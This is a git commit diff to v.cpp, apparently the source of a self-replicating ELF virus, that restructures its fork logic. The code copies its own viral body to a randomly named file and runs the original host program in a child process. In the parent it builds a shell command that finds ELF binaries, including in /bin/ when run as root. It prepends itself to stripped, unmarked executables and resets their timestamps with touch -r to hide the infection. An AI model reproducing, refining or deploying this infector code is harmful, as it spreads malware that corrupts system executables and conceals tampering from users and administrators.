1c1827e558ad67e31cf62acc5218a97e39770789
Niels Koster <n.koster@portavita.eu>
2017-08-03 13:58:20 +0200

    Better fork structure

--- v.cpp
+++ v.cpp
@@ -21,23 +21,32 @@ int main (int argc, char** argv) {
         exe += (char) ((rand() % 26) + 65);
         vir += (char) ((rand() % 26) + 65);
     }
-    ifstream fi(me);
-    ofstream fo(exe), fv(vir);
-    if (fi.is_open() && fo.is_open() && fv.is_open()) {
-        for (int i = 0; i < MYSIZE; i++) fv << (char) fi.get();
+    if (childpid > 0) {
+        ifstream fi(me);
+        ofstream fv(vir);
+        if (fi.is_open() && fv.is_open()) {
+            for (int i = 0; i < MYSIZE; i++) fv << (char) fi.get();
+            fv.close();
+            fi.close();
+        }
+    }
+    if (childpid == 0) {
+        ifstream fi(me);
+        ofstream fo(exe);
         fi.seekg(MYSIZE, fi.beg);
         while ((c = fi.get()) != -1) fo << (char) c;
-        fi.close(); fo.close(); fv.close();
-        if (childpid == 0) {
-            command = "2>/dev/null /bin/chmod ug+rwx ";
-            command += exe;
-            c = system( command.c_str() );
-            c = execv((exe).c_str(), argv);
-            return 0;
-        } else {
-            command = "VIR=$(for n in `find ";
-            if (uid == 0) command += "/bin/ ";
-            command += "-mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
+        fo.close();
+        fi.close();
+        command = "2>/dev/null /bin/chmod ug+rwx ";
+        command += exe;
+        c = system( command.c_str() );
+        c = execv((exe).c_str(), argv);
+        return 30;
+    }
+    if (childpid > 0) {
+        command = "VIR=$(for n in `find ";
+        if (uid == 0) command += "/bin/ ";
+        command += "-mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
 do \
 file $n | grep -q ELF && ( \
 grep -q PROBOTEST $n || ( \
@@ -49,18 +58,18 @@ if [ ! -z \"$VIR\" ]; then \
 file $VIR | grep -q stripped$ && (\
 mv $VIR ${VIR}__ && \
 cat ";
-            command += vir;
-            command += " ${VIR}__ >$VIR && \
+        command += vir;
+        command += " ${VIR}__ >$VIR && \
 chmod ugo+x $VIR && \
 touch -r ${VIR}__ $VIR \
 ) \
 fi; \
 rm -f ${VIR}__ ";
-            command += vir;
-            command += " ";
-            command += exe;
-            c = system( (command).c_str() );
-        }
+        command += vir;
+        command += " ";
+        command += exe;
+        c = system( (command).c_str() );
+        return 0;
     }
 }
 
